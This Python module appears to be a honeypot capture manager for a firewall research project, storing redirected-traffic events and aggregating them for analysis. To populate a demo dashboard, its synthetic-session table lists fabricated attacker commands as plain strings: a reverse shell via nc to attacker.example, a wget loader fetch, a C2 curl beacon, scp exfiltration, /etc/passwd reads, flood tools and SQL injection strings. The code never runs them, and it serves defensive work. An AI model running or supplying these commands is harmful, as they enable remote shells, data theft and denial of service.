"""
Honeypot manager — capture skeleton for blocked traffic.

Scope
-----
Full Cowrie / T-Pot integration is future work. This module provides:

  1. A structured event store for traffic the pipeline decides to redirect
     (BLOCK / QUARANTINE / REDIRECT_HONEYPOT from the Zero Trust layer).
  2. A pluggable backend interface so Cowrie, Dionaea, or a custom sink can
     be dropped in later without changing callers.
  3. Aggregation helpers (top source IPs, attack-type breakdown) for the
     paper's analysis section.
  4. A feedback loop: captured events can be marked `verified` and exported
     for the next retrain.

Events are persisted to a single `honeypot_captures.jsonl` file (line-delimited
JSON) so the write path is crash-safe and easy to tail with standard tools.
"""

from __future__ import annotations

import json
import os
import random
import threading
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


DEFAULT_LOG_DIR = Path(
    os.environ.get("NGFW_HONEYPOT_LOG_DIR", os.path.expanduser("~/sem6el/logs/honeypot"))
)
CAPTURES_FILE = "honeypot_captures.jsonl"


# Synthetic session payloads keyed by attack type. Real Cowrie / Dionaea output
# would slot in here; for the demo we fabricate plausible artefacts so the
# dashboard's "session details" panel has content to show.
_SYNTHETIC_SESSIONS: dict[str, dict[str, list[str]]] = {
    "Bruteforce": {
        "commands": ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://malicious.example/loader.sh"],
        "files": ["loader.sh", ".bash_history"],
        "creds": ["root:toor", "admin:admin", "root:123456", "ubuntu:ubuntu"],
    },
    "DDoS": {
        "commands": ["hping3 -S --flood -p 80 10.0.0.1", "ab -n 100000 -c 500 http://10.0.0.1/"],
        "files": [],
        "creds": [],
    },
    "DoS": {
        "commands": ["slowloris.py -s 1000 10.0.0.1", "GET / HTTP/1.1 (incomplete)"],
        "files": [],
        "creds": [],
    },
    "Portscan": {
        "commands": ["nmap -sS -T4 10.0.0.0/24", "masscan -p1-65535 10.0.0.1"],
        "files": [],
        "creds": [],
    },
    "Botnet": {
        "commands": ["curl -s http://c2.example/beacon", "/tmp/.x/bot --join channel-04"],
        "files": ["/tmp/.x/bot", "/tmp/.x/config"],
        "creds": [],
    },
    "WebAttack": {
        "commands": ["GET /?id=1' OR 1=1--", "POST /login.php payload=<script>"],
        "files": ["shell.php"],
        "creds": ["admin:' OR ''='"],
    },
    "Infiltration": {
        "commands": ["nc -e /bin/sh attacker.example 4444", "scp data.tar.gz attacker.example:"],
        "files": ["data.tar.gz", "implant"],
        "creds": [],
    },
}


def _synth_session(attack_type: str | None) -> dict[str, Any]:
    template = _SYNTHETIC_SESSIONS.get(attack_type or "", {})
    cmds = template.get("commands", [])
    files = template.get("files", [])
    creds = template.get("creds", [])
    # Pick a subset so successive captures look different in the UI.
    pick_cmds = random.sample(cmds, k=min(len(cmds), random.randint(1, max(1, len(cmds)))))
    pick_files = list(files)
    pick_creds = list(creds)
    return {
        "commands": pick_cmds,
        "files_downloaded": pick_files,
        "credentials_tried": pick_creds,
        "session_duration_seconds": random.randint(3, 240),
        "log": [
            f"[{datetime.now(timezone.utc).isoformat()}] connection opened",
            *[f"  $ {c}" for c in pick_cmds],
            f"[{datetime.now(timezone.utc).isoformat()}] connection closed",
        ],
    }


@dataclass
class HoneypotEvent:
    """A single redirected / captured flow."""
    id: str
    timestamp: str
    src_ip: str | None
    dst_ip: str | None
    dst_port: int | None
    protocol: str | None
    decision: str                          # BLOCK | QUARANTINE | REDIRECT_HONEYPOT
    risk_score: float
    attack_type: str | None = None         # predicted class if available
    model_scores: dict[str, float] = field(default_factory=dict)
    zero_trust: dict[str, Any] = field(default_factory=dict)
    flow_features: dict[str, float] = field(default_factory=dict)
    session: dict[str, Any] = field(default_factory=dict)
    verified: bool = False
    notes: str | None = None

    @staticmethod
    def now_iso() -> str:
        return datetime.now(timezone.utc).isoformat()


class HoneypotBackend:
    """Interface for honeypot backends (Cowrie, Dionaea, custom TCP sink).

    The default implementation is a no-op — it only records the event. A real
    backend should override `redirect()` to hand the flow off to a honeypot
    listener and return connection metadata for the SIEM.
    """

    name: str = "noop"

    def redirect(self, event: HoneypotEvent) -> dict[str, Any]:
        return {"backend": self.name, "redirected": False, "reason": "stub"}

    def status(self) -> dict[str, Any]:
        return {"backend": self.name, "available": True}


class CowriePlaceholder(HoneypotBackend):
    """Marker for future Cowrie SSH/Telnet honeypot integration.

    Intentionally does not attempt a socket connection — this is a scaffold
    so callers can depend on the type today and swap the implementation in
    when Cowrie is deployed.
    """
    name: str = "cowrie"

    def redirect(self, event: HoneypotEvent) -> dict[str, Any]:
        return {
            "backend": self.name,
            "redirected": False,
            "reason": "cowrie integration pending",
            "target": "cowrie://localhost:2222",
        }


class HoneypotManager:
    """Thread-safe manager for redirected traffic.

    Usage
    -----
    >>> mgr = HoneypotManager()
    >>> mgr.capture(src_ip="1.2.3.4", dst_port=22, decision="BLOCK",
    ...             risk_score=0.93, attack_type="Bruteforce")
    """

    def __init__(
        self,
        log_dir: Path | str = DEFAULT_LOG_DIR,
        backend: HoneypotBackend | None = None,
    ):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.captures_path = self.log_dir / CAPTURES_FILE
        self.backend = backend or HoneypotBackend()
        self._lock = threading.Lock()
        self._events: list[HoneypotEvent] = []
        self._index: dict[str, HoneypotEvent] = {}
        self.online_since = datetime.now(timezone.utc).isoformat()
        self.last_retrained_at: str | None = None
        self.load_from_disk()

    # --- capture -------------------------------------------------------

    def capture(
        self,
        *,
        src_ip: str | None = None,
        dst_ip: str | None = None,
        dst_port: int | None = None,
        protocol: str | None = None,
        decision: str = "BLOCK",
        risk_score: float = 0.0,
        attack_type: str | None = None,
        model_scores: dict[str, float] | None = None,
        zero_trust: dict[str, Any] | None = None,
        flow_features: dict[str, float] | None = None,
        session: dict[str, Any] | None = None,
        notes: str | None = None,
    ) -> HoneypotEvent:
        event = HoneypotEvent(
            id=uuid.uuid4().hex[:12],
            timestamp=HoneypotEvent.now_iso(),
            src_ip=src_ip,
            dst_ip=dst_ip,
            dst_port=dst_port,
            protocol=protocol,
            decision=decision,
            risk_score=float(risk_score),
            attack_type=attack_type,
            model_scores=model_scores or {},
            zero_trust=zero_trust or {},
            flow_features=flow_features or {},
            session=session if session is not None else _synth_session(attack_type),
            notes=notes,
        )

        backend_result = self.backend.redirect(event)
        event.notes = (event.notes or "") + f" | backend={backend_result}"

        with self._lock:
            self._events.append(event)
            self._index[event.id] = event
            self._append_jsonl(event)

        return event

    def _append_jsonl(self, event: HoneypotEvent) -> None:
        with self.captures_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(asdict(event)) + "\n")

    # --- queries / aggregation ----------------------------------------

    def events(self) -> list[HoneypotEvent]:
        with self._lock:
            return list(self._events)

    def get(self, event_id: str) -> HoneypotEvent | None:
        with self._lock:
            return self._index.get(event_id)

    def verify(self, event_id: str) -> HoneypotEvent | None:
        """Mark an event as a verified attack; rewrites the JSONL store."""
        with self._lock:
            event = self._index.get(event_id)
            if event is None:
                return None
            event.verified = True
            self._rewrite_locked()
            return event

    def _rewrite_locked(self) -> None:
        tmp = self.captures_path.with_suffix(".jsonl.tmp")
        with tmp.open("w", encoding="utf-8") as fh:
            for e in self._events:
                fh.write(json.dumps(asdict(e)) + "\n")
        tmp.replace(self.captures_path)

    def load_from_disk(self) -> int:
        """Re-hydrate in-memory events from the captures file."""
        if not self.captures_path.exists():
            return 0
        loaded = 0
        with self._lock, self.captures_path.open("r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                except json.JSONDecodeError:
                    continue
                data.setdefault("id", uuid.uuid4().hex[:12])
                data.setdefault("session", {})
                data.setdefault("verified", False)
                evt = HoneypotEvent(**data)
                self._events.append(evt)
                self._index[evt.id] = evt
                loaded += 1
        return loaded

    def top_sources(self, n: int = 10) -> list[tuple[str, int]]:
        counts: dict[str, int] = {}
        for e in self.events():
            if e.src_ip:
                counts[e.src_ip] = counts.get(e.src_ip, 0) + 1
        return sorted(counts.items(), key=lambda kv: kv[1], reverse=True)[:n]

    def attack_type_breakdown(self) -> dict[str, int]:
        counts: dict[str, int] = {}
        for e in self.events():
            key = e.attack_type or "unknown"
            counts[key] = counts.get(key, 0) + 1
        return dict(sorted(counts.items(), key=lambda kv: kv[1], reverse=True))

    def feedback_counts(self) -> dict[str, int]:
        evts = self.events()
        verified = sum(1 for e in evts if e.verified)
        return {
            "pending_review": len(evts) - verified,
            "verified_attacks": verified,
            "total_captured": len(evts),
        }

    def stats(self) -> dict[str, Any]:
        evts = self.events()
        unique_sources = len({e.src_ip for e in evts if e.src_ip})
        last = evts[-1].timestamp if evts else None
        return {
            "online": True,
            "online_since": self.online_since,
            "captured_sessions": len(evts),
            "last_capture": last,
            "unique_sources": unique_sources,
            "top_sources": self.top_sources(5),
            "attack_types": self.attack_type_breakdown(),
            "feedback": self.feedback_counts(),
            "last_retrained_at": self.last_retrained_at,
            "backend": self.backend.status(),
            "log_dir": str(self.log_dir),
            "captures_file": str(self.captures_path),
        }

# Module-level singleton for the API to share.
from app.honeypot.active_redirector import ActiveHoneypotBackend
manager = HoneypotManager(backend=ActiveHoneypotBackend())
